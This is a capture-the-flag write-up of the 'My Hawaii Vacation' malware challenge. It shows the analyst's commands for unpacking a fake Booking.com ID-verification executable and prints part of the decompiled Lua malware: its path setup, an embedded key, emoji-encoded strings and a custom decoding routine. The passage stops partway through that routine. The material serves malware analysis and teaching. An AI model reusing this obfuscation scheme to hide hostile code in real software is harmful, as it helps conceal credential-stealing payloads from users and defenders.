Challenge: My Hawaii Vacation
Category: Malware
Author: John Hammond

Description:

Oh jeeeez... I was on Booking.com trying to reserve my Hawaii vacation.
Once I tried verifying my ID, suddenly I got all these emails saying that my password was changed for a ton of different websites!! What is happening!?!
I had a flag.txt on my desktop, but that's probably not important...
Anyway, I still can't even finish booking my flight to Hawaii!! Here is the site I was on... can you get this thing to work!??!

CAUTION

This is the Malware category, and as such, includes malware. Please be sure to analyze these files within an isolated virtual machine.

Solve:

1. Navigate to the Challenge URL either via VPN or Proxy and enter in some bogus information to advance the challenge [booking-1.png]

2. Download the malicious executable and start analyzing for clues

┌──(ctf㉿kali)-[~/Downloads]
└─$ file Booking\ -\ ID\ Verification.exe 
Booking - ID Verification.exe: PE32 executable for MS Windows 4.00 (console), Intel i386, 3 sections

3. Running the binary through DetectItEasy we can determine the language this was compiled in to be "Lua"

4. I had AI write me a quick Python script to extract the LUA components from the PE file [extract-lua.py]

┌──(ctf㉿kali)-[~/CTF/huntress2025/malware/my_hawaii_vacation]
└─$ python extract-lua.py "Booking - ID Verification.exe" 
Wrote Booking - ID Verification-chunk-0.luac (offset 176660 length 24044)
Wrote Booking - ID Verification-chunk-1.luac (offset 200704 length 81631)

5. Running each chunk through "Unluac" (https://github.com/HansWessels/unluac) I was able to decompile the LUA. It appears that the first chunk is corrupt, and that 
   Booking - ID Verification-chunk-1.luac is the main component. 

	┌──(ctf㉿kali)-[~/Downloads/unluac/bin]
	└─$ java -jar unluac.jar ../../../CTF/huntress2025/malware/my_hawaii_vacation/Booking\ -\ ID\ Verification-chunk-1.luac > 1.lua

5a. https://luadec.metaworm.site/ could also be used for the disassembly and will give the graphical represntations of the Emoji's used in the encoding

6. Not being familiar with LUA, I once again relied on AI to decipher what was going on. I was able to determine that there was some Base32 style encoding takin place and then I extracted that function to decode the encoded strings via: https://glot.io/snippets/fnarug0ca6

   Decoding Function:

  do
  local exedir = (function()
    local p = arg and arg[0] or ""
    p = p:match("^(.*)[/\\]") or "."
    return p
  end)()
  local sep = package.config:sub(1, 1)
  local function J(a, b)
    return a .. sep .. b
  end
  local d = J(exedir, "deps")
  local luaPaths = table.concat({
    J(exedir, "?.lua"),
    J(exedir, "?" .. sep .. "init.lua"),
    J(d, "?.lua"),
    J(d, "?" .. sep .. "init.lua")
  }, ";")
  local dllPaths = table.concat({
    J(exedir, "?.dll"),
    J(d, "?.dll"),
    J(d, "?" .. sep .. "?.dll")
  }, ";")
  package.path = luaPaths .. ";" .. package.path
  package.cpath = dllPaths .. ";" .. package.cpath
end
local __K = "RR3IL6YJTKWSXB3I6KRTAAVBFXUV2Q5BBDNBH5UTPAPCHZXKTJNYG5PALFL5VXAS2OVF3IPATW223ITWHHYEFUAAYXFJLO6IN662OXG33IBFO5XORQJFW24PFIWF4BWMVAAZ3LW3VPPKZLI4DQBBHFI6NRF4X3TCWK2FUK7VQXBHOCAZNDKZNUNIPOD3YRBWZDRWBHKZGQFXNZ6274TMH3I5D6JXS4IZDS33AGD45AWXC4GLBPG4L2S57EQ5B2Q5CFSFD4GF6BI5IMELFKIEZQXNN3FSP2XDCXF4453L4AUJE7TJUED7TCMMTAJ3HCLWOPUIBBTUXSI5N2X2BZ2BIKV4SC4TUBYHDEIEDCUC3C7ZKXHP3LBCP4BCTOXIJ27W7E5WMXGYV7A2KQMWDLZ6GROH2Y6LMWNG7VXXCP5OEKFBTXCCWVPI66LTGGQ5RK3SJJBBV4SN2JBQ5UGY7ZU5VX2FVTGOW2YNBRUHNJKO3JTKPPJX72RFRJ47EX7TXZPG7WJ4MQKFIAPCGVQD2LNKN6MRG5PFMDMM2GIXWBQKHUB37F4DMGDIQNU5PIKDTA6HI7NPC3YMNYALOXT25YQLLOAEGZ2H3FXOL5VD4O3G35XF22Q7SHAGIBH3JG4IQARIXY47HJFGU6P6EB3NZLHLTHFFLU5OYXITWPYTO2QRPT6A2FVO6PWQAIU5FXMWTBOJRLDGTJRLDQ72BAQFLBSUEYRZKY5O4ZHTQZRU3D7TIR7QTYJBKAG47YRSMWNYMHPUPG23LILCKB2TUWKBKGYOP2DQKT2AHHQM35L4LNO57BLRR65BHBO7IUO36ZRFKE3GBJSZUPZETHB32K7ONGKFSZYAIU677DEHNPYQYQSBCFQZI5RSSQNSVQ4YE64UVIPNWGVS5LCYELT5BFQC4QU7GXJLURGUUUIYN3JF2QHLJQ2V3ZMEO7Q3SFUMLLTXR4GVAAIAVPDGYCS62HS5IXWP4QFNLGBYSIKQ6OHZJSJENFETMLZP6VLJQNJUHJR3FIIQUW4J4W7QEYOTI6LVZ6YEQRNJIIQKWD3QQYCWIYSRHRGR7ZVWFTPSDQS37CA5W5J2PUMSSV3I74FZOJAQLAFG5YISBJQBKRT2KJSO6ZECXFZSOFHYEHMGOEDOSDJPOFUEYWNEH4NWMQAZ462FEU3DJM2Q6EO4FSZNN66CXN2QOF4TNLDYA2BM3HMQSHVT5DQJM5LJV4OXLS32H2PVX3LU4BDSRMOECPV4QQH4YTD7RMBOIOPW3RXCCSKXRCYXKUBECGLYGPO7SO7RBYCQFEUG6UYWUQZFZSL7WHPYOTNXD7BLWDFJ7JAXBYVNOLONJEWQENY5HI2ZPBZ2PHAGF65DFBK7FXD72KRNSMNYSHSCG72TZRYZ7CE4VBYPB56SIXTS3G3E25JIRVIAUZLAXI4P2H26ZNOHKNHFYF6YPKXFXCE55PR4WLZ5432QSMBMSTPDRZESHOP5HBZLCBNJ5M4DZNMV5USRAH34IVFMTHLL5F6CUUCVTNL6OUZLMXMWCAJ3L2CUGH6BBWBBWE4LIOVPGQ5W2QWJKTLUWITFBMVD2GW5NGN27VK4HV7N57FIHVSGZPHHUOFB7JKB6SDP2LVEYHOLGUGQ6IUC3AKFX65FCWD6WOHESIK2JF7R6CPWCODTBBYORV2CCEUU57OO43ISSEUKY4RMBWCFORSZ4QX7OBGIYH2TPWZDA55LAKXLSTGBD6OOKONJUGFC4QMYQV7RN2REBQNVMMNG56MPBXWDBCXKXKLDMY73NHAGMEONFXIWJWUXAJWXWKU33T4RXVDRHFE2E7KBKGXWBI4EMIEUQCK2J4Z5CDLSH7O5POPGUP4YQWQZZCVA77HGZDT3TRZV6EY3V43G7IJWMEBEUAAYJWSYRNAVHHMR7YNG47FP44Y7EGTKZAOB7PTW5IUVOXTWAC76S2VZYNEY5LMF4X355UPY6NGLBCJP4CZRSOGGTZXIZQKKAB4RYRP2FGZ7EUUXXYDR3K3PM74FGE7CMJ5KG6UYTSQSQLHB6RZRUR7OSBJVT2H3ERHFL5OCUMPWAYLTH56UE4FS5CNUZ3OQ7GWTETA5XJKHPRNMGFZ5QPACBYMPFTOE7ERY4Y2OVMAG4MRU6H5AW5R4WFJBTMTQFHP5O23HHQDFEEAC5MY2DWQPGSEJQ3CM3JENCYX47V5ODAQWGAG5PLVZ625ETWCOUNEHPKFXEMRACFYCIOUPSK335C4KNFO6S4Q464LDPTG5BJTZGNUUAYJMGAMPDTLPIRFEGUV2DDN3DQWLTNCSDFEZMLBSEZU2AFFPUUNBW6VWTLP4SLEPRHRVN5HOTSGCNSJSTRHGEOQ7NDFCBEI5WYTO6MU7POXM2BGN7LBWSFELPSHHKWAQABVDEYERRQ3L37NBUQGORTO2VHCBDQDTXWCLQCP5IH5N6FUA3UKETR5VYOB3NOHQTLMZ2MG3RDK37H4VUFDWQOBBUYN7RPGECPY3IQOPXAAGC6R5NCONGTVNC6Z7T7Q57IZQU7EUO3J6BALUPIYRIVZQZDYABML3JRJUFSM4BL322T5V63K273YZWGZDNUWERVBEDJKMQSYCVG266G2ZSJ6DUINNGMIXUHI7SQP72JBYQQBK5E57TEUMK23AJESKSMOMDJ55FIDEMDV47HMNFWGXV2JBLFOQCMJ3H52ZNIRLOFV6PUSPTIPOLCVV25OJTPXKCQGP76E3LIGNUZDI6IO26WFX3WASXJUYE2T4YHOYBYIKOABCFYOYHPMLLOMZHJWIQHLKYVQ2XULH34SY4MAWJFLW5ZPR447VGO2P63E6O746CRRP5XGXAIZDCRYMJOS3PKJUCIT2OBNVANXEGE6AAH7D6HPBHJHO43FW7PD5GYSMBOZEKJIFF6RF4YRQSTWG7XV7MBBMIOLNZ6BDB57DJGVNR34DZYF5XWDU4KIVTRMVHAXWJY27UM5CDOF5BWF6JXHSRPELGKMZFAAW3DDCXZB3K5INGHIT33OSAUQBAP5KV3VTPNNNIJTRSRHMT6PQSBCMQYA5IBCJU3TSSZJLCJFYVT2K4NMH6WZYKQQL7CWB2VJCHVWL76PN4R3XFMYLWOSFAOMWMTNGDEGC6Y6EP6ZWSHBSPH775GUIOZD4NYX6YWTKSWYILT5NF6H5UTO4L4FYZXT2DHQUTT5R3LT57IVZHJPHY6EPKU3XPISBCKTTJNZJQEMK7SFNMOZXV27TZIOOKIPHAMF2KWG24GGU62XWDCSU2JHVSLEDGONHAGFFHU5SGE4ZPFJ56HRXVGV5NPQIY236CHBP4GAQL4PQI3QBVKMI3BJ3BTJPI3VFWGNRCWGWMTOHE2YWAD7Q27GHID7LFFBCXZVTTCDTB3DWOC4GH5THHXL6N3OBPVZESJFUBOTTQMKSVTBI5KJYVHXVMLCRWEDMWVTT7HUHMGZYEL7YKSWIPFAQDXI2V3NZAW2W6U7XSWN2QDQIOQO5QJ6FHOMOY6477QE4WYE7EG3W6AFUSJYYMAGLOLUXDZYEROHWYPQYLJPLF7GWS3PIVMMWFVMVDTLO3PLU2TIBSZ6DJ24CPHFDCS47RVLT65KA5GHPZHRAUJGXVG3GUSJGPT3NGC7MATWXHAW5BO76RN77GYRL4MSEVZNB5BSG4FMJDI5KIEGGL7AL7QVBNZOROCEIRBB4PGH3UKLW5K4QHJFS3YRTM6KVYNXVIHZYNIJLYYODIXK5ILZB2SJXPSQRHVVZSXPTHKKIWT4M77V44OEADI7QUNYWKJAMLXBFRELZTLAFBH5WNCCSYO573DKQFMY3YUWQ2F7ADCZ56E653XFZS75HU7M7S3O76A7FV3RU7M4BD2UBF6ZQN66KOM5IRQJJXB3JWVEMQPHJI472CGW3R4G7HVAZYZNPIBZEBEB5FVARIRUICDJBSZPHRCWUC3SPR5FERFSV4EGRD67SWZRV6Y23KY2TN5NWCLBGQXDT3FY2D7L3A6N6GSYMB4FFGDXJVJDKBGXRE4DDFONPELZMPXN3VA2BT3F3AGYLXREMEQJIBVZCS6BP5OXUE5RB64BC65WPMXXR37ABRMUILFONPPT5WQ5ZZ72FULEYP463P42T5CNOZJKJ3PM4USOCH5W4BMZDVGRX4RJCRFEYDEY7HZQJNAAMGXTT3J27TJLWA54WFYFXYO2AYCMXGAEBRO2WL7HXOLOFCIPLSBLWTYCD6FX4IBTAJ3POSPNZP5GLPYI7D5OUABJW3FARZK54XOOQZKNXH3ND7IQCSKPMMMBAX4CQQYASCWI2JAKYSMOVWAKFHCXKFMTG7GEKXGVE5AE3QQKAMEGNGJX346F4STVPYLDKTKY7GFQ62PGWVYK7SMFVMA54LNANZ6IYWCPP2VSIZC5IQJCVKCD6NBXHKI7HECUW2UWVHQXBRU6QZZXP5QIB7F4CEXHJQGOFGDZZFAS5TNNOOJ6XOV6WUEE2XWPDSW5UE2YXNLTWNA2EY3DTIMW3F4JU57ZEVRAFDJD25NFETA3DJQVMSKSOMJEA6ZYBXUNKXL43QOKAJ7VH2CXH3L2AI7AQE3KSUWW2TYHLJ7UTO27SBM2MWC4QY2NTZPPO4DILC4F4TP2Q7CNFJDVXP7FIS7J7JIT5GSMO5W7OOQL22RP6YSB5QZ74SRNE56G54YHJHQDHTEACIVTIJOGHDJAVKQYMJHTCBMRT4RACOOMFI3OEGHG2PM7RKGCFFJEU4CSEJZVZABQ2NGW7U3NC462QVK6TTOTHNUARCJ2NZYUKCFV4DFR4MTBN2S6PTSUJGISCNBSJXALSHRIEAUER6D42VIBYOULT4U5VHYHCQ6PF32YR5SVGLSQYZYD35U5Z3XQ6BIZ2XOV5UJUGXMWKZJ5ZAU26V3QZS7MFDQUJTJFGLOHJSXNLBD2QBAFVWQE5GAO7GFXD2CNADTI4UGNGCTBLBFY7ZY5SGL4Q6K25UJGIBYEH2Z5C2GSNBXEKG4UWNAX3T5WMGVLSJWV7HVPDMSTGROYWMYYMXISCAS7WPXMCDMTPDB66USGFQP5SQOWTA4RWLUGXMVJ7QENL6EU5BGTTTRLEUNNZSHYR5RMDCJEIZ53KLBCRPSPUBSVCAMHZX7IKN2MVL2YJKYOZB6Y64BCKIB5YZDFXJ5GRTLXUK2N4GKYYCARVUFH7X4SJ5FE5NMYVAGMVBC3VCWYTEO33TEDRFZOK667FWR4EMGBSNPQYG4E7DTW4SUX3XW5QNER7G4TFZMWC3FBSPMI6JTUVGMGYPV2VEPM2BGADDQMXTAE2N32H57PVYIF7QVKTKKZMZ2P6J6AHARXWE5ZOCGZOPEQK5IZ2VX3DSQQG2IJ2AX5D3PPPJYWF6UZV6JWDW24YLP3KSHUX3XYMNQHDFKQTKRPP67MB77ACXU3UWJ7BFSPPKBUVQD4OJIJ3G2ALISJWOITTWIQJBQRQ4OZZ6FTPAT6IPJNSPAZWNFKM7VABEBOL2P37MKG3WS2BFZANOWHOLZKYEESDXPT3BIGCKCVN3V75OP2TPX7RUNZOILDLXGK33N7ZNDMWXFNDIO3U6LBSUBEIH3SQSZ3XGAROY5O3V7KT32QWUADDR3IBBONFBQ2NNM2YWCJKBPGKZVI674NPWEWQDRVHDMHN2SXUM335GV3N7VRBYWB3Y7R3M2XR4COEK6RLXBJRLUIRKOFBODJMYKKU4LDF7Q4Y3HCS4EZMR52CVIIMCXBGWRPPPJ34RCIKGOH4E7ZEX3FVX3ZTMPMFLNM67XIHNXUQEI34GILPK2IOIYJTWAANDGQQENJVJQT67BVOV2F36TVXZXCBX64WCQF462Y4Y576FPDR34H3JQLX5H65O4A5MWVQ3MQAVXHHYQTBGEETUV3TWHTWW3TRKSO6T2ZNAGM3S4YBSLE6CW3ZLDXTFJWZJZPZOOPJAOPU6CZ7DXR2KYHTK2SX5K44YUBGMZJ474O4IEFA5S54RU4HZNTBTKMXWPDV33B6B7NT57ZQPGMNTKTY4BJIGJJK4QMVYNIKWPQCUQVJ54YUC4JMOQOM2JYQVYNQGAYUW567YN65UAXERQCPYFMSXNJKOTNNWV3D332JLJOCPTJWQAJW3PH53ZVJU7CLH6YQSXYYKKKKJEEIRWFMGK6BTWYSWKNNFCJ7VZZU465JDE3HGVYIRPA6B6N2R5BI5QAABXV2RTHDTMGI435B4QGYWPYZU4T4CYWHVIBM4KX7CICTI3FLLKTLO26YIDJCYSJJVH52KKYATV3Z7Q7UNZQIBJQ4WY2RYQX2VTIYC3S7XMW45RG2QAIPAL4ZX5TRHY2T27HRSQ2NZMLJTOB55724KXXU427HY3XKC4UO23WAERAA5QO2S5BVFSH6RMI52EF6CA2HDXHLJQSG2EEFZA5YMVGSQDAUTBQIRDND6RIE5EU45VGJ7WBIEYP7FXVTCLSIYG2ILVU6JIM6HPTT6LGXKITQQKNSAS7G4APUXYOCR7YOMF357MGUSCBSQJVBC3RLZPRIM5GPIYCZ5SNLAUF7MYQW54ZXW5UCCNGGYYTXO2FPBDCCZ2YA6AADQYYMX3TP5OXYVTVRBFHBCKB5DDL6QTSO4B3RINR56R6RSOKHBLAQ4SIEB3X6UXOZKEF2EWM67ZJJE2VCTMS32BAH7FPOZKZZWWOLZ6UESINTUBBOE556KOEQZ3AZEYORTVY2XNC6FO4EPSP46FK6W7MHWVBLIYYRLF3FHCXKXYS2PB7ZVK4OQW3TZWYWZ6J4D7XNJMX3K645RWVV6WX5KLO5IA5G2ZQ3XZ4QQB5QVKU4RMI6DET3QLI4IJA5OLTNUSRDWZWWIWT4YKY4LKGQP5UTLD5TOKS5A3KQJFBOQ52BTEIOMCQT4Y2O5KNGCG6RPUYEYQZGVX4JLZII5NVZ4S2G75BHBNNXHCLT3FQRA32BEFF5KLESSHVGZXXZ6CECHSGGG66JQ625UCGJUFIKQKASKIWVDW7762CFZFXAMDCCFXX2MZZDQW4SQTLRPTHWF7QW4OQ6DG7YPI3YK7Y7K6Q6Q66Y2DC5AJUGP4DLIZC2SIJSTJRDJCCJ5LYYIQBJIPJUXMHJIBIJGP3FJQGAIJ5FZUK353XIPXETQEDEK3QVNVVCQZXIR4QQRROR4Z7IPMGTM32GDNSMCG6HLI2ZZTZV5T6KWYU6AZ72HZGU5HVG6ZJQD5TIQBH63YEJLF2LLZWC36HYD4CUXZNTVEI5CCUAGPNPQTCODCO67FBRN3FBB7QQKWJUOH33VBZBGZQO2C3ARDO3RIVIJZCWRERGWQEC4E4WPJATH3M5PPE6H35HRUJQC5MNMZQ6YNSICNCMFL2NTIKDLMN7HCOXVC3M66S2QUP3BVVJBZX3YH22RFXYLAEJ333OFBWJCQEZ4CK65N7BLYDT5NB6AG6ENQJVAMLFVPGI2P4D4OVC66EWYV3ZB2V37536WHEP2EQ6O6FKKQMUKXLG5XKOXLR6EAHOYN6IPZNQPGN3ZPA4PRLR55F7PHJLQXVTPNUSXW5DSV5MMLJ5QQ3EYHH23AP2Y4RJTH3DRRCM2RETBSOWIZWEL6L3TAKBYSIL4LY4STQR3VG6RZCPVFNHINPBGTA34RGMY2NJ6UQWYL2FWDGM4V3W74W5VLII75QRIM53X6PVD53XO5DR7R7RFMMRQF6QAAXZK4HSS3LVMXISIXTML3FOIV546TYL4KWRFA3F44U7SAILURDE42PVFGCXHGE54XDGUEBTCVRP53XNDZAW53T2PFJLLDSW3U6GPJLRZCICRFB67YFYGA45YEC2GREGNYJZAKHZBVLV22MJBGZS64YOCT7PEYQRTA26RRFAYBCRW7SVAEXZZIG2WJCFPLF5IFGVYFPYRGZ6GLAEHHVXXJOJS4ECNJSYT3BSR274K5GKGWMZMYMLXMMBW3BVQHBY6XMV5MKXSTXXS4LOSMBOKCFT6PDWPSCW2VLPUFSLKCSAUYUB4OQHG6MPU6P2LLAOPXSGXHV3VIBM2RSHTV24OK2V47LDIJRMKI57QHRWZR5HRN6NGOFI7UGB3ZGXGFJ3JPYG2ALYDKWJF6BVQXJVI3SLKYBN4ORXA6GSPVMPJVXIZ75XJ4XMSI27KOMMRPVUGEX3F3EXE33DJCVJOAJ5GW5ZWAXBEDXT7QPEIXUR2OJ3QQWHW243QYQO45ZOEJ6OLZVGIKYFUHUHH23XUURLWO5G4WM2R4NGJ6S7VJQOZOYBSQTJHLLQ7II7IAMCZQLS26FFEPEPQB44NQ3MLMTU5EGWOQM7TOBMETZAWKUSXBSW76S265ZFYBZ65YKR2FB7EJXVIT757WC4KRGRVAFKYSIIOQLKLLMY5WCWU2WGLSAWZLA6JCF6G2F4LJ2BU2U6LNVQPO4SNXBF23P46WMTRP24CR3BNYDOMYVAHRDLRMHF4RCSDGI3GVKHXM7WPC73H3NOV7JJX6YUDURIHGRX7G4BSHTZIU7POKZIU6AZGBPI5HN4LFBLFGPMFUIUUUZFWZFMVZUDR5X3AX375P4B46S3OU5EAAJQOTW4ACIP2WVNHWNABJUKLDQJDGHNPKFYQ5Y36GJ2BACYZ6UMVKCM37TTVAQMCIHG2EGL7E3FIUPDP2DLKV3L4T33GHLKZ4YWNSJFRZMLXAIDZIL3OIESIZJ3QOM3UM4RR7V5PS2Q2REREI2GJDGMMI2OTJE32FDSBA6EC4JAI7N4UZCHXCDYYZQW33VZAXHS5REVDN52KNM5R3DICLBGHHQNGFCMGL3FSKDPCKRJB4AGLNLL5OYRU6S7JN65T75BQ7CWTRXO4R7NGW3WQWTLXWYFYFGGOVG226LUK3ZB46G5HOEMYYFJGAW7NCBSYUBGUIWQBY752MCO45C3YBIVKHEQ7DGNZGILWMRC3LYTARXP6APVQGUS6Q4FCQPDAU3MCSBLOUTWZBXW3SVNWTQ4UYWW3JSOTIW37QGGDXUYFEJIMNOS2YR3NGY6PPJF3F3BHXAWXSLYVI3F6A6LWFRXZZX5BJXW4CIV76G2M5AU27OSQGY4NCGNL674HLHUGZ4AYEMXIUSYHGXQ3M5BILHATBBF4F6FKZUB3AM3SEDKBVYGAUFPL6HHWI2FKGHOAR2QXTPDMDGE5RG34UIKCQSMZSS3H4OSRLKA5P3WVEB3MFDXOASYXWA6GYQ73JDSEXKNYJ5Y3W4RYA3QSLP63HZDWSRIGJGMGARW2CB4SOBK3NL535YFVJ42X3HEVVCXCTVH6ZGJNF2W7LHD2YBDK46F7Q7ZF3R2ZYIR3NB6PDB3EOL76Z7UL4TRBLFQZY3JFGYCJNRPGSY7FLRLDUZTQSAIBJ2ZIRYT3TYRHWPLU6RF3DL6GPGM34BLPJSPAVSW25H76ST5XUHMMWQA7MGJPVXWUKFKNHPRCDT5NK7WRORDVCLVOASY6DBDZJY5IQLHKW6ZZOCKVXU5IGMCASTCBKVNZFPLIRLYH4OFQAADXUGHWG6SBOZT2Z4LSQ5CCFONZMDT6OZXYVH5ZQVQKVE6ZBZJK242CA27TIRSHJMNAZVLYMTORMIYPV7I24RXA3ZEJHWFW6WN2QPO7X3AZAKUAS2B6NWQRHJQT25ZDX7CO4M4L7RHY765FE6ZGMRW5TEQH5GPVICHRADP75Q7MC3B5Z74AQH3N3FCU3I7BHOSXNQKGZCZCEWCTEDYXDCE6UG4ZLYL2DHOWB3KDLCUJW5DQWW3WUZ2MZLLXJJCROFMSLAYFNFRJADZK2WOH5MARCJ6FDKFHCNZIXASN7QHN2NB2DMZZ4GSSXUBNLA42HAVU7BKEUYY4UW3H67VS4X4ZB5276HYU4SSVCJP2UGWO52ZE6YRYZNOZNL2EBYS44JHKUCEENH3YNFEKBMTDMUU5RABL4YNQORFQR5JFEYZM6KLVEYBQBPQQXJRH3MSD7SGII7TG6HMCQEEY5JDL4PW4PVRB27FTLT5B2PQBQJG5GKH6UINPSKVPX2I375BCSBLIIEYZIJK7S27LIAJJP7EX327KVSIYX2DP6TWX7NYB3OHF6CHNVGBBL3A5TSSH3MILUTHDNHR4YNAX562PDTGZAESP7F6WE3FZTIFV2JGF6UVW2ABEFNT3AOBOPP6UL7DCFSQ6ACNF6ZCHM6CRLFQ2XL355FGDJBRKRBQDI3JYAJUSFUPX4NSXAX4FG5ERU25CFBH7LD63BKBUX6BZ6CT7KM6WAQGSPESI5QNADWH63HT66OBNN5U7BVOO5VCY3KXDQ2SI6WUVKUUXDZPKNT4CFWR3UYYLFHUJDHON2DBRNPCNEPF6TEJTX4WOO5GTDTUYWZ34LMXRCPKQRQO5TF4EQDHYKC2P3QMXYVZXPSA6YHH4ECP6Y5Q3VP47P2KK26PHJ6G6NKWQERCG5RARCYZNV6I2ARIIZWP2MDVXCSCXSQQG4DOYMQ4X7PU4OOLZGE4WPEOB7XW3II737G3IRFB7B5EL5AMN6BIYTHVHYJ6WYW22IPI3XRLTYGJYTPPJCLEQEFKTWR76GWURMQ2QJYCFMLGIB4WJ5RKN4DCHPR3J6TQPCNSCIUVXNKWIM4CGTR6NF3XU6FMB5FOJZQLJLXYL662VRFR3LQAKFNFSKTCCBERBPH45QI4TLPAWWTIZIGJPMTZANOGJSFSRQXBU2QQQ2IZHZ6B7S53MNLKSXEY7IHLT5DYP7Z3P7BNKV5CLUBIRRD4PTEVHGN3GYZJQWQBMJ5TVFF7QXDXY2B7GXSJ6LJJBZGCJKOTLBMUUWQUB6QIMVO32S3COQF4C277Q3YXSFRNMBIFV2IA3I7KMHQOLFRLSLA2ERUIB6W764E2KGU5GXGCM2ZDUYSY4XY3A6SIZ3HVUJ6X4WLUZRARYZKD66AFWLPUSAFXAR3FBKY7W5YZAYCKW4NG6LQSZLTH3VPQCPCROKD45NZWNVQYC6Q565QUDL53LT3VDNKZATEYEM2EL7LSZYRFHJBBHKKT6CGTYMAFFUK6IVAHGZXFISVOFRVUUJOYXGJKVMG4IDNZSIKPEBGBAOEM7NVLNFOSC7BAL7B4QE7M2PY5DG7XP7ZA3ZNZTBYDPWDRDBMTKNC5ULPVAXW6KX2BF3KDCEW3UGAXQFZB5IQSRH6SKZHXGBHMSYNXNEGYYBKRMDIH5TLU7UZ7GVVYGDXBS23WZG7XGZ6FFXWVGBBDSANYZJIMWUCYHYLISATG7I5SVYHJJFP72N7IFL254VCM6LGO6OYHE2OGXUF7EILOHSS7FE6IXOYOJXV2MQDTEBO23N5JPX6EAYQAZYWXW5WXBPTBAIIIEMGK6R5O7245VEZRRX33ODFLLVHQ6FPXBT72X6YAOOX7VYPSUVNSTNBGETXVZ4XMVZ4VJUTSWMMGIQHCALXQHLJJIEWBI735WTKCSSERDCKP2VYKDZQJBO2XNSMT6DKAQGB4HATPGDUMPWMK53QS623FF2FSQ5ERI2MCYCOOBB5RNNWU2NSIXPLFLFVNTJCO5LWOAJ2PFCZD36W2Q7LO3AGKABZTUJT72QOJMHAH3FMM56FHCAXPCNXNSWOQVB75TGS6PLOB24BR4PGOTCED4JPXPBZW4W5O6NG5W57CCPOODBO2GEB2D5HXL43IYI6AV6ZVNSPH3YMOB4IGLDZMALJ6B4PQHCFQRWO63XMMFMCGSFZN4CROTFG656WHRAWJUPUUVLNMIQE75CYAYGMLZ5O54JZBQYZJERJ3GRRJTOFVO7OFGHCYYNCX4QG5KEHTRY5FLCHEYXRYM754ELKI4XPBIA4ZJ5GCLLPKE26GFFWNNYYSWNOQGAKS7FRFQUCOAYF5VO7LJPDEPNSX4GRWCAHPCHP27T7WQU35FJ2S7COTX5PALM7SR4S27F5V2DMWJQJXL3OC2ZC3FKJFT24C2FYBIYJQ5AP4NAXJCPBXQQOP4TEAQILFLVMTHAGKGQVHBL7XFUOKM7N6T3AENFPUM2TSZNBDWUJNAENN23H5LGH427HEC6FOBBEJZEQXHU3H6UJV6ESK34OIF5RDKORY5LVOIBEZGEEOI5H4MDOQI65PVGFNMU5CPCNCTTGJHTGSEAVFPKV7343U76GEDE7LVOSXD3YRAJ7EBIDTFC4POK2UV3ENI55NQISOSV75BOHI3DLIO6RCCDY6TESYXIKIFWA5KQYAAMRSTUZJCPHRS6H3JOBAK4WRX5ZPS4RU33GCDAHCFTEZ3D73DYDDEN3KY7T3AP2KA2Y7ZHP6MJYKPSGB6WZWCRSENUE7DW762NMF6QGUZG6GTLDKTZN4ZZQFTTZFSQ6WDXYHUNNKOGE6EG2O4PIBCJMHPN5CNJLUWLMFURVOPLBRGTATFT2EV6IK4ZMMM6PJMCLUDXIORY26TS45TZQQDIMJMJUEXYVY5ZEZI2SCGREZG3EBC3SHB4JDYE325MM2TISKJJGUY635BJZGU74ZVZYKCVFF7SRSE624RKDWKKY6CXI6RFYESSMWKUX35NX6V4Z7S3BARYRDU7QOW2SGBHUC6MIAECOGCFYMWHBM4HDQQCUV5N5G7MUW2FVEECVDQXS2WOUYGX6UNMZRRWLDS5JVVFTLWMNIYHMMP6S7ZJEECCNUEA3DO5ZBJI2SO6OR2XHIKRGHM26RBO7VY5DWHW54IBVTJJZ5AQ74PSSSZHO"
local __P = true
local __E_SPACE = "\240\159\144\160\240\159\144\153"
local __E_QUOTE = "\240\159\144\160\240\159\140\180"
local __E_BSQUOTE = "\240\159\140\138\240\159\144\172\240\159\165\165\240\159\140\138"
local __E_REDIR = "\240\159\144\160\240\159\144\153\240\159\140\138\240\159\140\138\240\159\140\180\240\159\144\160\240\159\165\165\240\159\140\186\240\159\144\172\240\159\140\186"
local __E_TAIL = "\240\159\144\160\240\159\144\153\240\159\140\138\240\159\166\128\240\159\144\162\240\159\144\160\240\159\166\136\240\159\165\165\240\159\144\179\240\159\144\153\240\159\144\139\240\159\144\179\240\159\165\165\240\159\144\153\240\159\140\136\240\159\144\179\240\159\166\128\240\159\165\165\240\159\140\186\240\159\140\139\240\159\140\136\240\159\165\165\240\159\144\160\240\159\144\139\240\159\140\186\240\159\140\180\240\159\166\128\240\159\144\154\240\159\165\165\240\159\140\138\240\159\144\172\240\159\144\172\240\159\140\138\240\159\144\160\240\159\144\179\240\159\140\180\240\159\144\161\240\159\140\136\240\159\166\128\240\159\140\139\240\159\144\161\240\159\144\162\240\159\144\160\240\159\144\179\240\159\166\128\240\159\165\165\240\159\144\162\240\159\166\136\240\159\140\180\240\159\144\160\240\159\144\162\240\159\144\153\240\159\140\186\240\159\140\186\240\159\166\128\240\159\166\136\240\159\144\160\240\159\166\136\240\159\140\136\240\159\144\154\240\159\166\136\240\159\140\139\240\159\144\154\240\159\144\153"
local __E_READA = "\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172"
local __U8 = function(a, b, c, d)
  return string.char(a, b, c, d)
end
local function __T()
  return {
    __U8(240, 159, 140, 186),
    __U8(240, 159, 140, 180),
    __U8(240, 159, 140, 138),
    __U8(240, 159, 140, 139),
    __U8(240, 159, 165, 165),
    __U8(240, 159, 140, 136),
    __U8(240, 159, 144, 162),
    __U8(240, 159, 144, 160),
    __U8(240, 159, 144, 172),
    __U8(240, 159, 144, 139),
    __U8(240, 159, 144, 154),
    __U8(240, 159, 144, 179),
    __U8(240, 159, 144, 161),
    __U8(240, 159, 166, 128),
    __U8(240, 159, 166, 136),
    __U8(240, 159, 144, 153)
  }
end
local function __D(t, k)
  local T = __T()
  local S = function(k)
    k = tostring(k or "")
    local s = 3237919422
    for i = 1, #k do
      s = (s * 1315423911 + k:byte(i)) % 4294967296
    end
    return s
  end
  local M = function(seed)
    return function()
      seed = (1664525 * seed + 1013904223) % 4294967296
      return seed
    end
  end
  local X = function(a, b)
    local r, p = 0, 1
    for _ = 1, 4 do
      local A = a % 2
      local B = b % 2
      if (A + B) % 2 == 1 then
        r = r + p
      end
      a = (a - A) / 2
      b = (b - B) / 2
      p = p * 2
    end
    return r
  end
  if k == nil then
    k = __K
  end
  local key_on = k ~= nil and k ~= ""
  local permute = __P == true and key_on
  local toklen = 4
  local perm = {}
  for n = 0, 15 do
    perm[n] = n
  end
  if permute then
    local r = M(S(tostring(k) .. "|perm"))
    for i = 15, 1, -1 do
